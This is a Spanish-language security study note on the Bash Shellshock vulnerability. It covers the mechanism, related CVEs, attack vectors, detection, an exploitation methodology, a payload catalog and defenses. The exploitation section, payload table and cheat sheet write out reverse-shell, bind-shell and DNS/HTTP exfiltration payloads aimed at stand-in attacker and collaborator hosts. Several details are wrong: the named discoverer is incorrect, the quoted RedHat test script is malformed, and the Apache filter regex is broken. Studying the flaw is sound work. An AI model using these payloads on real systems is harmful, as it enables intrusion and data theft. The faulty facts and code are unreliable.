---
aliases:
  - Shellshock
  - Bash Vulnerability
  - CVE-2014-6271
tags:
  - sec/web
  - sec/linux
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[OS Command Injection]]"
  - "[[Server-Side Request Forgery (SSRF)]]"
  - "[[Log Poisoning]]"
  - "[[Information disclosure]]"
fuente: "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"
---

# Shellshock: Vulnerabilidad en Bash

**Shellshock** (CVE-2014-6271, descubierta en septiembre de 2014 por Stefano Chierici y analizada públicamente por Casey Ellis) es una familia de fallos en el intérprete **Bash** que permiten **ejecución de código arbitrario mediante variables de entorno**. El ataque se activa cuando Bash *importa* una variable de entorno cuyo valor comienza con una definición de función seguida de comandos: Bash ejecuta esos comandos **al parsear la definición**, no al invocar la función.

> [!info] Por qué fue tan grave
> No es una vulnerabilidad de una aplicación: es una vulnerabilidad del **shell**. Todo lo que pase cadenas no confiables a Bash a través del entorno — CGI de Apache, clientes DHCP, scripts de backup, contenedores Docker, la variable `TERM` de SSH, procesadores de correo — queda expuesto. Afectó ~500 millones de dispositivos Linux/Unix (servidores, routers, cámaras IP, firewalls) durante ~20 años de historia de Bash (los fallos se remontan a Bash 1.14, 1994).

## Mecánica: cómo funciona realmente Bash y por qué ejecuta el atacante

### Cómo maneja Bash las variables de entorno y funciones

Bash permite **exportar funciones** al entorno del proceso hijo. En la superficie del usuario:

```bash
greet() { echo "hola $1"; }
export -f greet          # versión moderna; antes: export greet
bash -c 'greet mundo'    # imprime: hola mundo
```

Pero el entorno de un proceso UNIX es solo una lista de pares `clave=valor` de strings — no existe el concepto de "función" en el entorno. Bash serializa las funciones exportadas en el propio nombre/valor de la variable:

- **Antes de la parche**: `greet=() { echo "hola $1"; }` (el nombre de la variable era el de la función).
- **Después de los parches (2014+)**: `BASH_FUNC_greet%%=() { echo "hola $1"; }` (prefijo `BASH_FUNC_` y sufijo `%%` para mitigar reataques; ver más abajo).

Cuando un proceso Bash **inicia**, lee su entorno y, por cada variable que comienza con el patrón de función, la "importa": la parsea y la registra como función local.

### El fallo (CVE-2014-6271)

El parser de funciones de Bash, al encontrar el cierre `}`, **continuaba interpretando y ejecutando** cualquier comando adicional presente en la misma definición antes de registrarla:

```bash
malicious='() { :; }; echo "EJECUTADO EN EL PARSEO"'
bash -c "$malicious"
# imprime: EJECUTADO EN EL PARSEO  ← se ejecuta al IMPORTAR la función, no al llamarla
```

Desglose del payload clásico:

| Fragmento | Significado |
|---|---|
| `()` | Declara que el valor es una función (Bash cree que va a importar una) |
| `{ :; }` | El cuerpo de la función: `:` es el "comando void" (no-op), terminado en `;` |
| `;` | Fin de la definición de la función |
| `echo ...` / `/bin/bash -c "..."` | **Código arbitrario**: se ejecuta en el momento del parseo |
| Lo que siga | Puede ser cualquier cadena; Bash lo ejecuta y luego ignora el resto |

> [!warning] La ejecución es inmediata e inevitable
> El código se ejecuta **cada vez** que se lanza un Bash con esa variable en su entorno, aunque nadie jamás invoque la función. Basta con que *exista* la variable. Esto es lo que hace el ataque tan fácil de detonar y tan difícil de contener: cualquier proceso que lance un subshell con entorno heredado queda comprometido.

### Familia de CVEs de Shellshock

Tras CVE-2014-6271 se fueron encontrando fallos relacionados, cada parche descubriendo variantes nuevas:

| CVE | Descripción |
|---|---|
| **CVE-2014-6271** | El original: ejecución tras el cierre de la función (`} ; comando`) |
| **CVE-2014-7169** | Bypass del primer parche: Bash terminaba la función pero **seguía parseando** las líneas siguientes del valor (ataque en dos líneas) |
| **CVE-2014-6277** | Fallo en el parser de funciones con entradas malformadas → ejecución de código |
| **CVE-2014-6278** | Otra entrada malformada que producía ejecución de código |
| **CVE-2014-7186** | Fallo de off-by-one en el buffer del parser → corrupción de memoria |
| **CVE-2014-7187** | Off-by-one en el manejo de anidamiento de funciones → corrupción de memoria |

> [!tip] Verificación de parche
> Tras los parches de septiembre/octubre de 2014, las funciones exportadas viajan como `BASH_FUNC_nom%%=...`. Si en un sistema ves variables `BASH_FUNC_*` en `/proc/1/environ`, significa que usa un Bash *parcheado de 2014 en adelante*. Para comprobar si sigue vulnerable, usar las pruebas de la sección de detección — no basta con mirar la versión del paquete (los backports de distribución rompen la correlación versión↔parche).

## Vectores de ataque

El requisito es siempre el mismo: **una cadena no confiable llega al entorno de un proceso Bash**. Los vectores documentados:

| Vector | Mecanismo |
|---|---|
| **CGI (Apache/httpd)** | El servidor web convierte las cabeceras HTTP en variables `HTTP_USER_AGENT`, `HTTP_REFERER`, `HTTP_COOKIE`, etc. Si el CGI invoca Bash (o el script tiene shebang `#!/bin/bash`), el atacante controla el entorno |
| **User-Agent / Referer / Cookie** | Los vehículos clásicos dentro del vector CGI: cualquier cabecera reflejada al entorno |
| **DHCP (dhclient)** | Los servidores DHCP maliciosos envían `domain-name` o `ntp-servers` conteniendo el payload; los scripts de hook de `dhclient` los pasan a Bash → compromiso remoto sin autenticación de toda la LAN |
| **Cliente FTP GNU** | Respuestas del servidor FTP pasadas a `TERM`/`DISPLAY`/`ftp_*` vía subshell → RCE al conectarse |
| **SSH (`TERM`, `DISPLAY`)** | SSH copia ciertas variables del cliente al entorno del shell remoto (con `AcceptEnv` permisivo) |
| **Clientes de correo / filtros** | Variables de asunto/remitente exportadas a scripts de filtrado |
| **Contenedores / orquestadores** | Cualquier variable de entorno de contenedor (config, labels) inyectada por un usuario de baja confianza |
| **QEMU / hipervisores** | Variables de entorno de invitado propagadas por el host |
| **Webhooks / integraciones** | Sistemas que ejecutan `bash -c "$algo"` con metadatos del evento |

> [!info] Relación con SSRF
> Un **SSRF** contra un endpoint interno que ejecute CGI (por ejemplo, un servicio de monitorización con frontends CGI) puede detonar Shellshock sin acceso directo al puerto: el SSRF aporta el acceso de red, Shellshock aporta la RCE. En los labs de PortSwigger esto se explota exactamente así — ver [[Server-Side Request Forgery (SSRF)]] (Lab: Blind SSRF with Shellshock exploitation).

## Detección

### Prueba local de seguridad (no destructiva)

```bash
env x='() { :;}; echo VULNERABLE' bash -c "echo safe"
# VULNERABLE          → vulnerable a CVE-2014-6271
# safe (solo)         → parcheado

env X='() { :;}; echo VULNERABLE2' bash -c "echo safe2"
# safe2               → parcheado también contra CVE-2014-7169
```

Prueba completa del script oficial de RedHat/DFN-CERT:

```bash
bash -c 'true <<EOF
function e {
        touch /tmp/shellshock_test
}
EOF
ls /tmp/shellshock_test 2>/dev/null || echo "no vulnerable a 7169"
```

### Detección remota (CGI)

```bash
# Petición de prueba con la cabecera exploit
curl -H 'User-Agent: () { :;}; echo "SHELLSHOCK"; /bin/echo shellshock' \
     http://objetivo/cgi-bin/vulnerable.cgi
# Si la respuesta contiene "SHELLSHOCK" → vulnerable

# Exfiltración vía DNS (out-of-band, ideal cuando no ves la respuesta)
curl -H "Referer: () { :;}; /usr/bin/nslookup \$(whoami).BURP-COLLABORATOR.net" \
     http://objetivo/cgi-bin/test.cgi
```

Escaneo masivo:

| Herramienta | Uso |
|---|---|
| `nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi,cmd=echo%20pwned -p 80 host` | Escaneo remoto de CGI |
| `shellshocker.py` (projectshellshock.com) | Batería de pruebas multi-vector |
| `searchsploit shellshock` | Exploits y checks por versión |

### Indicadores forenses

- Llamadas salientes a DNS/HTTP desde el propio servidor (`nslookup`, `curl`, `wget` con dominios raros).
- Procesos hijos breves de Bash con variables `HTTP_*` raras en su entorno (`ps eww -u www-data`).
- Archivos creados por el usuario del servidor web (`/tmp/*.txt`, webshells).

## Explotación: metodología paso a paso

1. **Localizar un endpoint CGI**: `/cgi-bin/`, scripts `.cgi`, `.sh` servidos por Apache, paneles de dispositivos (routers, cámaras). Fuzzing con `wfuzz`/`gobuster`.
2. **Confirmar el vector**: inyectar el payload benigno `() { :;}; echo"$(head -c 5 /dev/urandom|base64)"` en User-Agent y ver si el eco aparece en la respuesta.
3. **Blind → OOB**: si no hay eco, exfiltrar por DNS con un colaborador (Burp Collaborator / interactsh): `() { :;}; nslookup $(whoami).TU-DOMINIO.net`.
4. **Escalar a RCE**: reverse shell. Payload para una cabecera HTTP (todo en una línea):

```
User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/ATACANTE/443 0>&1'
```

5. **Reconocimiento post-explotación**: `id`, `uname -a`, enumerar red interna — si el CGI corre como usuario privilegiado o dentro de un dispositivo, priorizar vector de escalada.
6. **Si no hay ejecución directa**: encadenar con [[Local File Inclusion]] (leer `/proc/self/environ` para confirmar), [[Log Poisoning]] o subida de archivos.

### Catálogo de payloads

| Objetivo | Payload (tras `() { :;}; `) |
|---|---|
| Eco | `echo vulnerable` |
| Escribir archivo | `/bin/echo pwned > /tmp/shellshock.txt` |
| Exfil DNS | `nslookup $(whoami).COLLAB.net` |
| Exfil HTTP | `curl http://COLLAB.net/$(whoami)` |
| Reverse shell | `/bin/bash -c 'bash -i >& /dev/tcp/IP/443 0>&1'` |
| Bind shell | `nc -e /bin/bash 0.0.0.0 4444` |
| Leer archivo | `cat /etc/passwd | nslookup $(base64 /etc/passwd | tr -d '\n').COLLAB.net` |

> [!warning] Ofuscación
> Cabeceras como `User-Agent` rechazan espacios y comillas en algunos servidores. Variantes válidas: `() { _; } >_[$($())] { _; }; /bin/bash -c '...'`, o usar `()` sin espacio y comillas simples. Cadenas con `\n` pueden partirse en dos líneas para CVE-2014-7169.

## Defensa (con código)

### 1. Parchear Bash (obligatorio)

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install --only-upgrade bash
# RHEL/CentOS
sudo yum update bash
# Verificar
env x='() { :;}; echo VULN' bash -c "echo safe"   # debe imprimir solo "safe"
```

### 2. Eliminar/desactivar CGI donde no se necesite

```apache
# httpd.conf — eliminar todos los handlers CGI
# RemoveHandler cgi-script .cgi .pl .sh
# Options -ExecCGI
```

### 3. No pasar cabeceras al entorno de Bash

```apache
# Apache: si un CGI debe existir, filtrar las variables más peligrosas
SetEnvIf User-Agent "^.*() {.*" bad_agent=1
RequestHeader unset User-Agent env=bad_agent
```

### 4. Código defensivo: nunca construir comandos shell con datos externos

```python
# VULNERABLE: el entorno hereda todo lo que llegue del cliente
import subprocess, os
env = {**os.environ, "HTTP_USER_AGENT": user_agent}
subprocess.run(["/usr/local/bin/report.sh"], env=env)  # report.sh es bash → comprometido

# SEGURO: no exponer cadenas externas al shell; usar exec directo sin env
subprocess.run(["/usr/local/bin/report", "--agent", user_agent[:200]],
               env={"PATH": "/usr/bin"}, check=True)   # binario, no script bash
```

```bash
# SEGURO: script CGI que sanitiza su entorno antes de usar Bash
#!/bin/sh
unset HTTP_USER_AGENT HTTP_REFERER HTTP_COOKIE HTTP_ACCEPT
# ... resto del script
```

### 5. Red / hardening

- Egress filtering: los servidores web no deben resolver/DNS-consultar dominios arbitrarios.
- Correr CGI en contenedores/sandboxes con red restringida y usuario dedicado.
- `systemd`: `ProtectHome=yes`, `NoNewPrivileges=yes` en units que ejecuten scripts.

## Errores comunes

**Del atacante:**
1. Esperar la ejecución al *invocar* la función: Shellshock ejecuta al **importar**; no hace falta ninguna invocación.
2. Payloads multilínea en una sola cabecera sin sanitizar: muchos servidores rechazan `\r\n` en headers (eso sería además [[Vulnerabilidades de HTTP Request Smuggling|HTTP Request Smuggling]]).
3. No verificar si el CGI usa Bash y no `sh`/`dash`: el fallo es de **Bash**; `#!/bin/sh` en Debian apunta a dash y no es vulnerable.
4. Asumir que por versión de SO está parcheado: los backports rompen esa correlación — usar siempre la prueba de detección.

**Del defensor:**
1. Creer que "no uso CGI, así que estoy a salvo": DHCP, FTP, backups y orquestadores también pasan entorno a Bash.
2. Parchear el SO pero no los firmware/embebidos (routers, cámaras, NAS) de la red interna.
3. Mantener `Options +ExecCGI` en vhosts heredados sin uso real.

## Laboratorios y referencias

- **PortSwigger Academy** — Blind SSRF with Shellshock exploitation (encadenado con SSRF): https://portswigger.net/web-security/ssrf
- **projectshellshock.com** — centro de pruebas y exploits oficiales
- **HackTricks — Shellshock**: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/shellshock.html
- **NVD CVE-2014-6271**: https://nvd.nist.gov/vuln/detail/CVE-2014-6271
- Notas internas: [¿Existe laboratorio propio? revisar DVWP y máquinas HTB con CGI antiguo]

## Cheat sheet

| Paso | Acción |
|---|---|
| Test local | `env x='() { :;}; echo VULN' bash -c "echo safe"` |
| Test remoto | Cabecera `User-Agent: () { :;}; echo SHELLSHOCK` |
| Blind OOB | `() { :;}; nslookup $(whoami).COLLAB.net` |
| RCE | `() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/IP/443 0>&1'` |
| Vector principal | CGI → cabeceras HTTP → variables `HTTP_*` |
| Defensa #1 | Parchar Bash + desactivar CGI innecesario |
| Defensa #2 | Nunca exponer cadenas externas al entorno de Bash |

## Relacionadas

- [[OS Command Injection]] — la familia de inyección de comandos a la que pertenece Shellshock por impacto
- [[Server-Side Request Forgery (SSRF)]] — el encadenado clásico SSRF → Shellshock en CGI internos
- [[Log Poisoning]] — vía alternativa para materializar RCE en servidores CGI/legados
- [[Information disclosure]] — `/proc/self/environ` como fuente de variables explotables
